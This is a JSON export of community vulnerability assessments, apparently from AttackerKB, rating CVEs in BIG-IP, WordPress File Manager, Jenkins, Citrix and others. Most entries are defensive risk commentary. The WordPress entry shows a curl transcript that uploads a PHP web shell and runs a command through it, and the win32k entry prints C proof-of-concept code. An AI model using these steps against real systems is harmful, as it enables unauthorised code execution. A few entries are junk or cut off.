      "document": "In the most recent vulnerable versions of BIG-IP, accessing [TMSH](https://clouddocs.f5.com/api/tmsh/) through the TMUI path traversal leads to \"RCE\" insofar as you can execute management commands in a **restricted** TMSH environment.\r\n\r\nThat said, there are a few different ways you can break out of the restricted shell. One method utilizes TMSH's command alias functionality to map a blocked command to an allowed command. This results in Unix shell access as root.\r\n\r\nIn either case, privileged access to an F5 BIG-IP device is critical, as these often sit at network borders and even provide SSL termination!",
      "score": 2,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "103e1243-19b4-457e-b1cf-fde2835b6529",
      "editorId": "110c4bc0-d96d-4bdc-a633-e66ae23e7b9b",
      "topicId": "6af22fd5-c587-4dc0-8152-ee54bae4638e",
      "created": "2020-09-03T19:02:59.107594Z",
      "revisionDate": "2022-07-07T21:25:05.205915Z",
      "document": "There is an [exploit](https://github.com/eriknl/CVE-2020-16152) for this. I was able to extract the firmware and statically confirm the vulnerability. I haven't tried to kick it off in QEMU yet.\r\n\r\nFun bug chain. The vendor hasn't patched this. If you're using this in your environment, you may want to disable the web interface as per the exploit's [README.md](https://github.com/eriknl/CVE-2020-16152/blob/master/README.md).\r\n\r\nNote that this HiveOS is not to be confused with the mining platform [HiveOS](https://hiveos.farm/). This is [Wi-Fi stuff](https://www.aerohiveworks.com/HiveOS.asp).",
      "score": 2,
      "metadata": {
        "attacker-value": 3,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "1a4228a8-bc05-41a0-a7ee-43d4fa7e381e",
          "name": "Difficult to patch",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "difficult_to_patch"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "d46c6468-2a35-4acb-8def-839c7d6c2067",
      "editorId": "110c4bc0-d96d-4bdc-a633-e66ae23e7b9b",
      "topicId": "50c24ddc-4812-44e4-81bd-ee1f707333f4",
      "created": "2020-09-03T19:38:12.674285Z",
      "revisionDate": "2020-09-04T18:14:59.311364Z",
      "document": "This XSS combined with [CVE-2020-3430](https://attackerkb.com/topics/opPQls1VB2/cve-2020-3430), a protocol handler RCE vulnerability, is a potent combination.\r\n\r\nNote that this attack requires intercepting/sending a crafted message to a recipient. It does not, however, require their interaction. If an attacker has local access to Jabber or is otherwise authenticated to a Jabber network, this isn't a stretch.\r\n\r\nPlease patch this in your corporate networks! Attackers have been known to read IM messages and even send phishing links through them. This is worse, since it's potentially wormable RCE... if you use Jabber at all. :-)",
      "score": 2,
      "metadata": {
        "attacker-value": 4,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        },
        {
          "id": "3e5a47c9-35b0-4d55-92e4-0e83e6cbb2ec",
          "name": "Difficult to weaponize",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_develop"
        }
      ]
    },
    {
      "id": "da4a7531-c23b-4013-a9f3-802ea8d6a38f",
      "editorId": "110c4bc0-d96d-4bdc-a633-e66ae23e7b9b",
      "topicId": "5534c783-b87d-4736-8f07-a1f32c7252f2",
      "created": "2020-09-03T19:43:58.16859Z",
      "revisionDate": "2020-09-03T19:43:58.171864Z",
      "document": "Please see [CVE-2020-3495](https://attackerkb.com/topics/JOR9rMpm7r/cve-2020-3495) for an example exploit chain.",
      "score": 1,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        },
        {
          "id": "3e5a47c9-35b0-4d55-92e4-0e83e6cbb2ec",
          "name": "Difficult to weaponize",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_develop"
        }
      ]
    },
    {
      "id": "858cf8fb-98db-4ade-b883-de06e337db22",
      "editorId": "110c4bc0-d96d-4bdc-a633-e66ae23e7b9b",
      "topicId": "7d89b1bb-bc6f-498b-bb0c-fc0eeb2373f3",
      "created": "2020-09-03T20:01:48.817258Z",
      "revisionDate": "2020-09-03T20:03:27.224094Z",
      "document": "There is a [PoC](https://bugs.chromium.org/p/project-zero/issues/attachmentText?aid=443369) in the Project Zero [issue](https://bugs.chromium.org/p/project-zero/issues/detail?id=2030). While this is just a crash, the researcher didn't rule out code execution.",
      "score": 1,
      "metadata": {
        "attacker-value": 1,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "cc249289-d74e-4045-8846-e7e31a173e95",
          "name": "No useful access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "no_useful_data"
        },
        {
          "id": "795f5056-8a39-4610-912c-c033bd6fd4cb",
          "name": "Vulnerable in uncommon configuration",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "obscure_configuration"
        }
      ]
    },
    {
      "id": "4b889522-f06e-4481-ab8a-2d772eedb6e9",
      "editorId": "b11e1f35-dfcc-4edf-8740-9cd5888244e8",
      "topicId": "bc51026b-2be3-44b4-bb8e-2feac9ce2de6",
      "created": "2020-09-04T09:14:12.358096Z",
      "revisionDate": "2020-09-09T21:19:15.293413Z",
      "document": "This exploit was used in pwn2own2020 and the exploit code is readily available. ",
      "score": 4,
      "metadata": {
        "attacker-value": 4,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        }
      ]
    },
    {
      "id": "95f73eb3-fbe8-4709-b11f-64e400312e9b",
      "editorId": "110c4bc0-d96d-4bdc-a633-e66ae23e7b9b",
      "topicId": "429d165b-c9c2-4d1a-93cd-ef9e3d9a3962",
      "created": "2020-09-04T19:42:56.066779Z",
      "revisionDate": "2020-09-04T23:14:33.522871Z",
      "document": "WordPress sites are getting exploited en masse with this vuln. The File Manager plugin is the first result for \"file manager\" in the WordPress plugin database. No surprise lots of people are installing it, considering its generic name. ~700k by the numbers.\r\n\r\nThe vuln is trivial to exploit and weaponize, too. If you're running the plugin, you need to bring in incident response. The edited PoC below shows that the vuln can be exploited in two requests to execute arbitrary PHP code.\r\n\r\n```\r\nwvu@kharak:~$ curl -s http://127.0.0.1:8080/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php [redacted] | jq\r\n{\r\n  \"added\": [\r\n    {\r\n      \"isowner\": false,\r\n      \"ts\": 1599193366,\r\n      \"mime\": \"text/x-php\",\r\n      \"read\": 1,\r\n      \"write\": 1,\r\n      \"size\": \"35\",\r\n      \"hash\": \"l1_eC5waHA\",\r\n      \"name\": \"x.php\",\r\n      \"phash\": \"l1_Lw\",\r\n      \"url\": \"/wp-content/plugins/wp-file-manager/lib/php/../files/x.php\"\r\n    }\r\n  ],\r\n  \"removed\": [],\r\n  \"changed\": [\r\n    {\r\n      \"isowner\": false,\r\n      \"ts\": 1599193366,\r\n      \"mime\": \"directory\",\r\n      \"read\": 1,\r\n      \"write\": 1,\r\n      \"size\": 0,\r\n      \"hash\": \"l1_Lw\",\r\n      \"name\": \"files\",\r\n      \"phash\": \"l1_L3Zhci93d3cvaHRtbC93cC1jb250ZW50L3BsdWdpbnMvd3AtZmlsZS1tYW5hZ2VyL2xpYg\",\r\n      \"volumeid\": \"l1_\",\r\n      \"locked\": 1\r\n    }\r\n  ]\r\n}\r\nwvu@kharak:~$ curl http://127.0.0.1:8080/wp-content/plugins/wp-file-manager/lib/files/x.php -d c=id\r\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\r\nwvu@kharak:~$\r\n```",
      "score": 2,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "c210425d-384c-406a-bc82-e744c1929e94",
      "editorId": "a2687577-b13f-45be-9822-4831bf5b3449",
      "topicId": "50c24ddc-4812-44e4-81bd-ee1f707333f4",
      "created": "2020-09-05T17:26:58.189943Z",
      "revisionDate": "2020-09-08T19:17:16.238115Z",
      "document": "It is doesn't user interaction and ",
      "score": -1,
      "metadata": {},
      "tags": [
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "cc249289-d74e-4045-8846-e7e31a173e95",
          "name": "No useful access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "no_useful_data"
        }
      ]
    },
    {
      "id": "b90e75e7-8edf-43f8-b849-8f4d6f688efc",
      "editorId": "9582c44f-28b9-4328-9571-1db00638b8f6",
      "topicId": "365547b1-e741-4cb5-94cd-aeb8ee1daca3",
      "created": "2020-09-06T14:59:40.754096Z",
      "revisionDate": "2021-04-12T19:56:18.383506Z",
      "document": "fghfgjj",
      "score": -3,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "84e2ae16-9813-42ff-877d-3ed0c44649a2",
      "editorId": "1754d880-537c-48c4-8738-5ad2ccde5258",
      "topicId": "7d142e21-5847-4c7e-bf66-fd61416d8107",
      "created": "2020-09-09T14:36:39.432129Z",
      "revisionDate": "2020-10-05T21:46:20.057422Z",
      "document": "A vulnerability exists within the `NtGditretchBlt` system call that can be leveraged to trigger an out of bounds read access within `win32kfull!vStrWrite04`. The bug manifests itself when the Special Pool setting is enabled through the [driver verifier](https://docs.microsoft.com/en-us/windows-hardware/drivers/devtest/driver-verifier) utility.\r\n\r\nAn attacker would use this flaw to escalate their privileges to that of the local system through this kernel mode exploit.\r\n\r\nExploitation would be very difficult, a successful attack would need an information leak as well as reliable control over the win32k heap which is more difficult on Windows 10 than previous versions of Windows due to type isolation (added in RS3) and the KASLR improvements (added in the Anniversary Update). The win32k subsystem is however available as an attack surface on all versions of Windows making it a very high-value target.\r\n\r\n```\r\n#include <Windows.h>\r\n\r\nint main()\r\n{\r\n    BITMAPINFO bi = {{0x28, 0x2, 0xfffffffffffffffb, 0x2, 0x4, 0x0, 0x0, 0x0, 0x0, 0x0, 0x2}};\r\n    char out[0x1000] = {0};\r\n    HDC r0 = CreateCompatibleDC(0x0);\r\n    HBITMAP r1 = CreateDIBitmap(r0, 0x0, 0x6, &out, &bi, 0x0);\r\n    SelectObject(r0, r1);\r\n    StretchBlt(r0, 0x0, 0x0, 0x8, 0x8, r0, 0x0, 0x0, 0xffffffffffffffeb, 0x4, 0xee00e6);\r\n\r\n    return 0;\r\n}\r\n```\r\n*Original PoC provided by Check Point Research, see: https://cpr-zero.checkpoint.com/about/*\r\n",
      "score": 3,
      "metadata": {
        "attacker-value": 4,
        "exploitability": 1
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "3e5a47c9-35b0-4d55-92e4-0e83e6cbb2ec",
          "name": "Difficult to weaponize",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_develop"
        }
      ]
    },
    {
      "id": "3489496f-60d3-492c-8ac2-07d085fac9c7",
      "editorId": "ba7d1514-7156-496b-8642-ed75d18e5d9b",
      "topicId": "434cecfe-43dc-4446-9c55-3edfd6742827",
      "created": "2020-09-09T18:09:10.882932Z",
      "revisionDate": "2020-09-15T13:54:42.340387Z",
      "document": "This is a vulnerability in the MSI AmbientLink Version 1.0.0.8.  The vulnerability allows a regular user access to a Windows device created by the msio driver provided for the MSI Ambientlink system.\r\nThe software device is vulnerable to a buffer overflow attack because it assumes that the received buffer will always be less than 48 bytes, apparently, even when longer lengths are specified by the IOCTL request.\r\nRealistically, as this software runs LED lights on MSI gaming motherboards, it is unlikely to pose a large threat to corporate environments and instead, poses a larger threat to home users or individually-managed PCs, making the patching process significantly easier.  I imagine it is also possible to simply remove the software temporarily.\r\nSee https://www.coresecurity.com/core-labs/advisories/msi-ambient-link-multiple-vulnerabilities for a more in-depth analysis and PoC code.",
      "score": 4,
      "metadata": {
        "attacker-value": 1,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        }
      ]
    },
    {
      "id": "a32311a5-bbd3-4850-95d1-a883fb1c5f72",
      "editorId": "9c3c0bdd-7a98-48de-a889-f351a2aec7cf",
      "topicId": "90047e82-fdd8-47db-9552-50d104a34230",
      "created": "2020-09-09T18:14:43.476577Z",
      "revisionDate": "2020-11-29T22:27:43.440238Z",
      "document": "There's more info in Rapid7's analysis [here](https://attackerkb.com/topics/Y2azzfAbid/cve-2020-16875?#rapid7-analysis), but as @tsellers-r7 and @smcintyre-r7 pointed out privately today, need for authenticated session + exposed PowerShell endpoint + user who belongs to specific Exchange groups = less opportunity for wide-scale attacks than something like February's Exchange vuln. I'm interested to see how [Steven Seeley's exploit](https://twitter.com/steventseeley/status/1303454166820556800) works if he releases it, though. Might be cause for quick re-evaluation.",
      "score": 2,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        }
      ]
    },
    {
      "id": "923b010a-ab69-4d23-9078-1b912cf7489d",
      "editorId": "d750dd2d-d52c-4e20-ac81-3f2046de7cc7",
      "topicId": "9126a82b-d5b2-4c7b-9142-3817813be0ce",
      "created": "2020-09-10T14:42:49.820019Z",
      "revisionDate": "2020-09-10T16:08:55.185571Z",
      "document": "MSF module \u2014 https://www.rapid7.com/db/modules/exploit/unix/webapp/zeroshell_exec",
      "score": 2,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "b7394533-89a0-45c7-9fa3-e7124adf5d2e",
      "editorId": "110c4bc0-d96d-4bdc-a633-e66ae23e7b9b",
      "topicId": "224346be-3451-4d5e-b98e-9811d066f75d",
      "created": "2020-09-10T16:18:08.90564Z",
      "revisionDate": "2020-09-10T16:32:32.382659Z",
      "document": "Not enough is known about this vulnerability, but if an unauthenticated attacker can knock out a PAN-OS device, that could cause severe network disruption. RCE would be even worse. Note that this affects only the Captive Portal and Multi-Factor Authentication interfaces.",
      "score": 1,
      "metadata": {
        "attacker-value": 3,
        "exploitability": 2
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        }
      ]
    },
    {
      "id": "da647765-cd45-4488-b843-7e0554ccb3a8",
      "editorId": "110c4bc0-d96d-4bdc-a633-e66ae23e7b9b",
      "topicId": "ae095fa4-d1b3-455a-a4a4-75e3b7a277f8",
      "created": "2020-09-10T16:23:22.050485Z",
      "revisionDate": "2020-09-10T16:31:35.772273Z",
      "document": "Not enough is known about this vulnerability, but this requires admin creds to the management interface, so mitigate this by choosing secure passphrases, securing credential storage, etc.",
      "score": 1,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 2
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        },
        {
          "id": "0e696d6d-665a-48bd-9636-06d0a3a2a211",
          "name": "Requires elevated access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_elevated_access"
        }
      ]
    },
    {
      "id": "489036e5-f2da-48c2-a978-1d0168f1d2a5",
      "editorId": "110c4bc0-d96d-4bdc-a633-e66ae23e7b9b",
      "topicId": "1de6cfe4-3360-44a6-a485-c54f0d55c98d",
      "created": "2020-09-10T16:25:12.069108Z",
      "revisionDate": "2020-09-10T16:31:54.950031Z",
      "document": "Not enough is known about this vulnerability, but this requires admin creds to the management interface, so mitigate this by choosing secure passphrases, securing credential storage, etc.",
      "score": 1,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 2
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        },
        {
          "id": "0e696d6d-665a-48bd-9636-06d0a3a2a211",
          "name": "Requires elevated access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_elevated_access"
        }
      ]
    },
    {
      "id": "128b2b6d-9e0a-487c-8e78-086b4dc687d4",
      "editorId": "e426cc12-067c-41a8-83c0-029757da0dbf",
      "topicId": "5a79a3dc-d4d7-4ff8-be45-a4e658714412",
      "created": "2020-09-11T17:56:28.659157Z",
      "revisionDate": "2020-09-24T22:46:50.8536Z",
      "document": "The `readFrom` method within the `Command` class in the Jenkins CLI remoting component deserializes objects received from clients without first checking / sanitizing the data. Because of this, a malicious serialized object contained within a serialized `SignedObject` can be sent to the Jenkins endpoint to achieve code execution on the target.\r\n\r\nThis is a fairly old vulnerability, so it's *unlikely* that there are many, if any vulnerable installations on the web today, but I rated this vulnerability based on what it *could* give an attacker if they were to find a vulnerable installation online today. This vulnerability is yet another Java deserialization vulnerability that I would define as critical given a number of reasons:\r\n\r\n1. Unauthenticated code execution \r\n2. There is no special / proprietary protocol that will hinder exploitation ( you just send the object in the body of a POST request )\r\n3. A proof of concept exists and has for some time\r\n\r\nAgain, this is an unlikely target given the date of the vulnerability, but I think an attacker would definitely aim to exploit this if it was spotted online. ",
      "score": 6,
      "metadata": {
        "attacker-value": 4,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "c9e929f7-770c-4e94-8b96-1392ba374a25",
      "editorId": "7ff62803-e0a8-4121-b324-d4afe9f60d43",
      "topicId": "18505d2d-11b6-4a22-b746-cf01e5c6608b",
      "created": "2020-09-14T16:27:55.39396Z",
      "revisionDate": "2020-09-14T19:49:08.652693Z",
      "document": "*This is still a provisional assessment pending more research.*\r\n\r\n__A high severity issue has been discovered in Citrix StoreFront that, if exploited, would allow an attacker who is authenticated on the same Microsoft Active Directory domain as a Citrix StoreFront server to read arbitrary files from that server.__\r\n\r\nThis CVE is for Citrix StoreFront that allows an authenticated user to gain arbitrary file read on to the StoreFront server. This could lead to further compromise depending on the ability to exploit data recovered from the server.\r\n\r\nThe official statement from Citrix can be found here. https://support.citrix.com/article/CTX277455\r\n\r\nUpdates are availaible\r\n\r\n- Citrix StoreFront 1912 CU1 (1912.0.1000) and later versions of Citrix StoreFront 1912 LTSR\r\n- Citrix StoreFront 3.0 for 7.6 LTSR CU8 Hotfix (3.0.8001) and later versions of StoreFront 3.0 for 7.6 LTSR\r\n- Citrix StoreFront 3.12 for 7.15 LTSR CU5 Hotfix (3.12.5001) and later versions of StoreFront 3.12 for 7.15 LTSR\r\n\r\nThe advisory states that attackers must be authenticated in the same Microsoft Active Directory domain as the StoreFront server, if not this vulnerability is not exploitable. \r\nThis significantly impacts the ability for an attacker to exploit this vulnerability. An attacker would have to be:\r\n\r\n- An insider threat with technical knowledge\r\n- An attacker that already has authenticated access to the domain",
      "score": 3,
      "metadata": {
        "attacker-value": 3,
        "exploitability": 2
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        }
      ]
    },
    {
      "id": "1b1e5cb0-1158-43f2-a837-5bc85870a060",
      "editorId": "7ff62803-e0a8-4121-b324-d4afe9f60d43",
      "topicId": "02ebd62a-34cd-495b-a157-9716755f4661",
      "created": "2020-09-14T16:38:44.443551Z",
      "revisionDate": "2020-09-18T14:41:39.801539Z",
      "document": "__BIG-IP platforms with Cavium Nitrox SSL hardware acceleration cards, a virtual server configured with a Client SSL profile, and using Anonymous Diffie-Hellman (ADH) or Ephemeral Diffie-Hellman (DHE) key exchange and Single DH use option not enabled in the options list may be vulnerable to crafted SSL/Transport Layer Security (TLS) handshakes that may result with a pre-master secret (PMS) that starts in a 0 byte and may lead to a recovery of plaintext messages as BIG-IP TLS/SSL ADH/DHE sends different error messages acting as an oracle. Differences in processing time when the PMS starts with 0 byte coupled with very precise timing measurement observation may also expose this vulnerability.__\r\n\r\nThats a lot to take in . . . \r\nA recent research study identified a timing attack against TLS that could be used to recover a shared secret that could then be used to recover plaintext of previously captured data.\r\n\r\nIn order to be successful outside of a testing environment, an attacker would need to intercept encrypted traffic and then send specially crafted TLS packets to a vulnerable server in the hopes of recovering enough data to decrypt the previously intercepted traffic. \r\n\r\n#### Conditions\r\n\r\nThis vulnerability affects BIG-IP systems with virtual servers associated with a Client SSL profile under the following conditions:\r\n\r\n- You are using ADH or DHE key exchange in the Client SSL profile.\r\n - *Note: DHE is enabled by default in the DEFAULT cipher suite. ADH is not available in the DEFAULT cipher suite.*\r\n\r\n- You have not enabled the Single Diffie-Hellman use option\u2014or Single DH use option\u2014in the Client SSL profile.\r\n - *Note: The Single DH use option is not enabled by default in the Client SSL profile options 